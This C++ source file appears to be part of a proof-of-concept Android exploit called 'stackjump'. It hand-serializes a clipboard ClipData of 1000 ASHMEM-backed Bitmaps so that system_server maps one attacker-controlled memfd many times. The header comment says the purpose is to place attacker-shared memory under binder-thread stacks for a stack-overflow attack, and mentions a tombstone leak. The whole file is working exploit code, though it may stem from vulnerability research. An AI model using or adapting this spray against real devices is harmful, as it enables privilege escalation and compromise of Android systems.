// The Bitmap-ashmem spray. IClipboard.setPrimaryClip is given a ClipData whose
// 1000 items are hand-serialized Bitmaps with BlobType::ASHMEM, all backed by
// our single memfd (shmem_fd), in 128K/64K/32K size bands. Unparceling each
// mmaps our fd into system_server; the mappings live as long as the clip does.
// In the reporter's original path this places attacker-shared memory below the
// binder-thread stacks so a stack overflow lands in it. (This build leaks via
// the crash tombstone instead; see README / leak.sh.)
#include "stackjump.h"

void parcel_writedata(AParcel *p, std::vector<uint8_t> data) {
  assert(data.size() % 4 == 0);
  for (int i=0; i<data.size(); i += 4) {
    SCHK(AParcel_writeUint32(p, *(uint32_t*)(data.data()+i)));
  }
}

void set_clipdata() {
  AParcel *in = NULL, *out = NULL;
  SCHK(AIBinder_prepareTransaction(clipboard_service, &in));

  // ClipData clip
  SCHK(AParcel_writeInt32(in, 1)); // ClipData is non-null
  { // normally generated by ClipData.writeToParcel
    parcel_writedata(in, {
      0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    });
    int num_elems = 1000;
    SCHK(AParcel_writeInt32(in, num_elems));
    for (int i=0; i<num_elems; i++) {
      parcel_writedata(in, {
        0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // mutable, colorType
        0x02, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
        0xd2, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // width  height
        0xd2, 0x04, 0x00, 0x00, 0xa4, 0x01, 0x00, 0x00, // rowBytes density
        0x02, 0xbe, 0xc2, 0x87, 0x15, 0x00, 0x00, 0x00, // id
        0x03, 0x00, 0x00, 0x00, 0x1f, 0x24, 0x00, 0x00, // parcelId
        0x01, 0x00, 0x00, 0x00, // BlobType::ASHMEM
      });
      if (i < 500)
        AParcel_writeInt32(in, SHMEM_SIZE);
      else if (i<750)
        AParcel_writeInt32(in, SHMEM_SIZE/2);
      else
        AParcel_writeInt32(in, SHMEM_SIZE/4);
      parcel_writedata(in, {
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      });
      hack_AParcel_writeFdRaw(in, shmem_fd);
      parcel_writedata(in, {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      });
    }
  }
  // String callingPackage
  if (getuid() == 0) {
    SCHK(AParcel_writeString(in, "root", 4));
  } else {
    SCHK(AParcel_writeString(in, "shell", 5));
  }
  // String attributionTag
  SCHK(AParcel_writeString(in, nullptr, -1));
  // int userId
  SCHK(AParcel_writeInt32(in, 0));
  // int deviceId
  SCHK(AParcel_writeInt32(in, 0/*DEVICE_ID_DEFAULT*/));

  SCHK(AIBinder_transact(clipboard_service, /*TRANSACTION_setPrimaryClip*/(1+0), &in, &out, 0));
  AStatus *status;
  SCHK(AParcel_readStatusHeader(out, &status));
  printf("status: %s\n", AStatus_getDescription(status));
  AParcel_delete(out);
}
